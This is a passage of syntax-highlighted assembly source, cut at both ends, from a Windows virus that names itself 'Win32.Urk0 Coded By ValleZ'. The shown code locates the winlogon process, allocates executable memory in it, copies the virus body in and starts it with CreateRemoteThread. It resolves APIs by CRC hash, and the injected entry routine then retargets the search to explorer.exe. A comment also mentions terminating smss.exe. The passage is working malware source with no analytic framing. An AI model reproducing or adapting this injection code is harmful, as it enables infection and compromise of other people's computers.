</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc5">PortHandle</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">UNICODE_STRING</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">USlen</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">26</span><span class="sc0"> 
</span><span class="sc5">USmaxlen</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">28</span><span class="sc0">
</span><span class="sc5">PUSbuf</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc1">;i have two strings becoz if USbuf is not alignmented then USbuf2 is it.</span><span class="sc0">
</span><span class="sc5">USbuf</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc12">'\','</span><span class="sc5">D</span><span class="sc12">','</span><span class="sc5">b</span><span class="sc12">','</span><span class="sc5">g</span><span class="sc12">','</span><span class="sc5">S</span><span class="sc12">','</span><span class="sc5">s</span><span class="sc12">','</span><span class="sc5">A</span><span class="sc12">','</span><span class="sc5">p</span><span class="sc12">','</span><span class="sc5">i</span><span class="sc12">','</span><span class="sc5">P</span><span class="sc12">','</span><span class="sc5">o</span><span class="sc12">','</span><span class="sc5">r</span><span class="sc12">','</span><span class="sc5">t</span><span class="sc13">',0
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">USbuf2</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc12">'\','</span><span class="sc5">D</span><span class="sc12">','</span><span class="sc5">b</span><span class="sc12">','</span><span class="sc5">g</span><span class="sc12">','</span><span class="sc5">S</span><span class="sc12">','</span><span class="sc5">s</span><span class="sc12">','</span><span class="sc5">A</span><span class="sc12">','</span><span class="sc5">p</span><span class="sc12">','</span><span class="sc5">i</span><span class="sc12">','</span><span class="sc5">P</span><span class="sc12">','</span><span class="sc5">o</span><span class="sc12">','</span><span class="sc5">r</span><span class="sc12">','</span><span class="sc5">t</span><span class="sc13">',0
</span><span class="sc0">

</span><span class="sc5">SECURITY_QUALITY_OF_SERVICE</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">SQOSlen</span><span class="sc0">             </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">12</span><span class="sc0">
</span><span class="sc5">ImpersonationLevel</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc1">;SecurityImpersonation  </span><span class="sc0">
</span><span class="sc5">ContextTrackingMode</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">EffectiveOnly</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">34h</span><span class="sc0">
                    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">


</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc5">GetWinlogon</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc1">;in:none  out: WinlogonHand with winlogon process handle</span><span class="sc0">
          </span><span class="sc1">;         eax = 0 if no error</span><span class="sc0">
</span><span class="sc6">pushad</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">200h</span><span class="sc0">
</span><span class="sc5">SaveSpaceSearchingWinlogon</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">SaveSpaceSearchingWinlogon</span><span class="sc0">
</span><span class="sc1">;esp -&gt; array of id of processes</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">Needed</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">200h</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">NtPsapi</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">GezApi</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">EnumProcessesCRC</span><span class="sc4">,</span><span class="sc5">EPSNameLen</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">GetWinlogonOutError_</span><span class="sc0">
</span><span class="sc1">;esp -&gt; array</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">
</span><span class="sc6">lodsd</span><span class="sc0">
</span><span class="sc5">SearchWinlogon</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">lodsd</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">GetWinlogonOutError</span><span class="sc0">
</span><span class="sc1">;vvv</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">WinlogonID</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc2">400h</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">NtKernel</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">GezApi</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">OpenProcessCRC</span><span class="sc4">,</span><span class="sc5">OPNameLen</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">NoWinlogonFound</span><span class="sc0">
</span><span class="sc1">;eax = process handle</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">WinlogonHand</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">Needed</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">WinlogonModuleHand</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">NtPsapi</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">GezApi</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">EnumProcessModulesCRC</span><span class="sc4">,</span><span class="sc5">EPMNameLen</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">NoWinlogonFound</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">50</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">WinlogonModuleName</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">WinlogonModuleHand</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">WinlogonHand</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">NtPsapi</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">GezApi</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">GetModuleBaseNameACRC</span><span class="sc4">,</span><span class="sc5">GMBNNameLen</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">WinlogonModuleName</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">lodsd</span><span class="sc0">
</span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">20202020h</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc12">'lniw'</span><span class="sc0">
</span><span class="sc5">winl</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">NoWinlogonFound</span><span class="sc0">
</span><span class="sc6">lodsd</span><span class="sc0"> 
</span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">20202020h</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc12">'nogo'</span><span class="sc0">
</span><span class="sc5">ogon</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">NoWinlogonFound</span><span class="sc0">

</span><span class="sc1">;^^^</span><span class="sc0">
</span><span class="sc5">WinLogonFound</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc5">GetWinlogonOut</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">200h</span><span class="sc0">
</span><span class="sc6">popad</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">NoWinlogonFound</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">SearchWinlogon</span><span class="sc0">

</span><span class="sc5">GetWinlogonOutError</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc5">GetWinlogonOutError_</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">200h</span><span class="sc0">
</span><span class="sc6">popad</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc5">AttackWinlogon</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc1">;in:none</span><span class="sc0">
            </span><span class="sc1">;out: eax = 1 error eax = 0 no error</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">PAGE_EXECUTE_READWRITE</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">MEM_COMMIT</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">MEM_RESERVE</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">EVirus</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">SVirus</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">WinlogonHand</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">NtKernel</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">GezApi</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">VirtualAllocExCRC</span><span class="sc4">,</span><span class="sc5">VANameLen</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">AttackWinlogonError</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">WinlogonVirusBase</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">NtKernel</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">WinlogonHand</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">SVirus</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">EVirus</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">SVirus</span><span class="sc0">
</span><span class="sc5">Writez</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">AttackWinlogonError</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">Needed</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc1">;pointer to a variable to be passed to the thread function</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">WinlogonVirusBase</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">WinlogonCode</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">SVirus</span><span class="sc0"> 
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc1">;stack size </span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">WinlogonHand</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">NtKernel</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">GezApi</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">CreateRemoteThreadCRC</span><span class="sc4">,</span><span class="sc5">CRTNameLen</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">AttackWinlogonError</span><span class="sc0">
 
</span><span class="sc5">AttackWinlogonNoError</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">WinlogonHand</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">NtKernel</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">GezApi</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">CloseHandleCRC</span><span class="sc4">,</span><span class="sc5">CHNameLen</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">AttackWinlogonError</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">WinlogonHand</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">NtKernel</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">GezApi</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">CloseHandleCRC</span><span class="sc4">,</span><span class="sc5">CHNameLen</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc5">Needed</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">WinlogonModuleHand</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">WinlogonModuleName</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">50</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">WinlogonHand</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">WinlogonID</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">WinlogonVirusBase</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">SmssHand</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">ExplorerHand</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">ExplorerID</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">ExplorerVirusBase</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">ExplorerModuleHand</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">



</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"Win32.Urk0 Coded By ValleZ"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc5">WinlogonCode</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc1">;When i inject code to winlogon,i create a remote thread that will start execution here</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">;remove parameter passed</span><span class="sc0">
</span><span class="sc5">callz</span><span class="sc0"> </span><span class="sc5">WinlogonCodeDoff</span><span class="sc0">
</span><span class="sc5">WinlogonCodeDoff</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">WinlogonCodeDoff</span><span class="sc0">

</span><span class="sc5">callz</span><span class="sc0"> </span><span class="sc5">GetLibrarys</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">winl</span><span class="sc4">],</span><span class="sc12">'lpxe'</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ogon</span><span class="sc4">],</span><span class="sc12">'rero'</span><span class="sc0">
</span><span class="sc5">callz</span><span class="sc0"> </span><span class="sc5">GetWinlogon</span><span class="sc0"> </span><span class="sc1">;i use same function to get smss.exe handle and terminate it.</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">WinlogonHand</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ExplorerHand</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">WinlogonID</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ExplorerID</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">WinlogonModuleHand</span><span class="sc4">]</span><span class="sc0">
